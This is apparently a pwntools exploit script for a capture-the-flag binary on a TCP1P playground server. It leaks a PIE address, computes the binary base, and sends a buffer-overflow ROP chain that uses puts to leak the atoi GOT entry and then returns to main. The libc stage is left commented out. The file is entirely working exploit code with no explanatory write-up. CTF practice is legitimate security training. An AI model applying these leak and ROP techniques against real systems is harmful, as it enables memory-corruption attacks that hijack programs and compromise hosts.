from pwn import *

# Set up context
elf = context.binary = ELF("./chall")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process()
rop = ROP(elf)
offset = 40
p = remote("playground.tcp1p.team",19001)

# Trigger leak
p.sendline("2")
p.sendline("1")
p.recvuntil(b"oke okeeeyy ini pie nya untukmuu, ")
leak_main = int(p.recvline().strip().decode(), 16)

# Calculate base address
main_symbol = elf.sym['main']
elf.address = leak_main - main_symbol
log.info(f"ELF Base: {hex(elf.address)}")

# Manually set gadgets based on dump()
mov_rdi_rbp_nop_pop_rbp_ret = elf.address + 0x11e7
pop_rbp_ret = elf.address + 0x1173

# Debugging gadgets
log.info(f"mov rdi, rbp; nop; pop rbp; ret: {hex(mov_rdi_rbp_nop_pop_rbp_ret)}")
log.info(f"pop rbp; ret: {hex(pop_rbp_ret)}")

# Build ROP chain
rop.raw(b"A" * offset)
rop.raw(pop_rbp_ret)      # Align stack
rop.raw(elf.got['atoi'])  # Set RBP for `mov rdi, rbp`
rop.raw(mov_rdi_rbp_nop_pop_rbp_ret)
rop.raw(p64(elf.got['atoi']))
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['main'])  # Return to main

# Send payload
p.sendline("3")
p.sendline(rop.chain())
p.recvuntil(b"\n\n")
leak_libc = u64(p.recv(6).strip() + b'\x00\x00')
log.info(f"{hex(leak_libc)}")
# libc = leak_libc - libc.sym['puts'] 
# log.info(f"{hex(libc)}")
p.sendline("4")
write("payload",rop.chain())

p.interactive()
